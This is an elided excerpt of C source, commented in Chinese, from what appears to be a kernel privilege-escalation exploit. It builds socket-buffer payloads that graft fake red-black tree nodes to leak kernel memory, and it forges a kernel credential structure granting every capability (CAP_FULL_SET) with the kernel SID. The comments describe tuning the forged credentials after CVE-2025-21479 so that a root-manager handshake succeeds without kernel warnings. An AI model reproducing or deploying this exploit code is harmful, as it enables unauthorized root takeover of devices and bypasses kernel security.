...
static int pfem10_prepare_skb_payload(uintptr_t leaked, int mode)
{
    ...
    for (size_t chunk = 0; chunk < PFEM10_PAYLOAD_SKB_SEND_SIZE;
        ...
        /* --- LEAK 模式: Stage-2 Case-3 graft 节点 (docs/18 §4.4 修正版,
         *   几何推导见 findings.md P1.1; 逐 store 对照 rbtree_augmented.h) ---
         * P0  = node->rb_right (in[1]): +0x10 = S1 = alias(MB)−0x10 →
         *       Case-3 copy 落点 = *(S1+0x10) = boot_id bytes[3:11) mailbox;
         *       +0x08 = 0 (§4.4 预置); +0x00 = pc (被 L271 rb_set_parent 覆盖)。
         * PC  = in[0]&~3 (假父/change_child 落点): 首 qword 预置 1 = BLACK
         *       → 后续 rb_insert_color 立即 break (§4.6 审计条件)。
         * GAP = in[2]: *(X+0x08)←GAP + rb_set_parent(GAP) 读改写, 页内可写即可。 */
        if (mode == PFEM10_PAYLOAD_LEAK) {
            uintptr_t mb = p0_data_alias(PFEM10_OFF_LEAK_MB);
            put64(p, PFEM10_PAYLOAD_LEAK_P0_OFF + 0x00, 0);
            put64(p, PFEM10_PAYLOAD_LEAK_P0_OFF + 0x08, 0);
            put64(p, PFEM10_PAYLOAD_LEAK_P0_OFF + 0x10, mb - 0x10);
            put64(p, PFEM10_PAYLOAD_LEAK_PC_OFF  + 0x00, 1);
            put64(p, PFEM10_PAYLOAD_LEAK_PC_OFF  + 0x08, 0);
            put64(p, PFEM10_PAYLOAD_LEAK_PC_OFF  + 0x10, 0);
            put64(p, PFEM10_PAYLOAD_LEAK_GAP_OFF + 0x00, 0);
            put64(p, PFEM10_PAYLOAD_LEAK_GAP_OFF + 0x08, 0);
        }
               ...
               (osid/sid=KERNEL_SID=1), keyring 区留 NULL (正常)。 */
        {
            ...
            /* securebits 0 (memset) */
            /* 同上 (2026-09-14 12:2x): 一律 CAP_FULL_SET=0x1FFFFFFFFFF, 不写 -1
             * —— 见文件后半段 cred_sv 专页那段的长注释 (21479 终稿 §5 的 ambient 不变式)。 */
            put64(c, PFEM10_CRED_CAP_INHERITABLE, 0x1FFFFFFFFFFULL);
            put64(c, PFEM10_CRED_CAP_PERMITTED,  0x1FFFFFFFFFFULL);
            put64(c, PFEM10_CRED_CAP_EFFECTIVE,  0x1FFFFFFFFFFULL);
            put64(c, PFEM10_CRED_CAP_BSET,       0x1FFFFFFFFFFULL);
            put64(c, PFEM10_CRED_CAP_AMBIENT,    0x1FFFFFFFFFFULL);
...
static uintptr_t pfem10_prepare_kernel_page(int mode)
{
...

    {
        ...
        /* ★ 2026-09-14 12:2x 修 —— 接 CVE-2025-21479 终稿 §5 的结论:
         * cap_* 一律写 **CAP_FULL_SET = 0x1FFFFFFFFFF**, 不能写 -1。
         *
         * 21479 dist 用一个月实证定位到的症状与根因 (README §5 / cred-offset-findings §4):
         *   shellcode 把 cap_ambient 写成 -1 → cap_ambient(=full64) ⊄ cap_permitted∩inheritable
         *   → **capability ambient 不变式破** → 每次 execve 在 commoncap.c 触发
         *   WARNING + 返回 -EPERM (实测 130 条) → **libsu 握手失败 → 管理器横幅"获取root失败"**。
         *   而 CapInh/CapBnd 全满本身就是"cred 被原始 -1 直写"的指纹 (KSU 从不写这两个)。
         *   修法: 与 init_cred 的 CAP_FULL_SET 完全一致 (0x1ffffffffff);
         *   bit>=41 本来就不是有效 cap → 功能零损失, 不变式结构上不可能破。
         * 对照: 21479 的 CAPSONLY shellcode 最终写 0x1ffffffffff。
         * 影响面: 本机 cred 布局与 21479 取证逐字段一致 (见 pfem10_target.h 228-252 vs
         *   cred-offset-findings.md §3), 所以这条结论直接适用。 */
        const uint64_t CAP_FULL_SET = 0x1FFFFFFFFFFULL;   /* 41 bit */
        put64(cp, PFEM10_CRED_CAP_INHERITABLE, CAP_FULL_SET);
        put64(cp, PFEM10_CRED_CAP_PERMITTED,  CAP_FULL_SET);
        put64(cp, PFEM10_CRED_CAP_EFFECTIVE,  CAP_FULL_SET);
        put64(cp, PFEM10_CRED_CAP_BSET,       CAP_FULL_SET);
        put64(cp, PFEM10_CRED_CAP_AMBIENT,    CAP_FULL_SET);
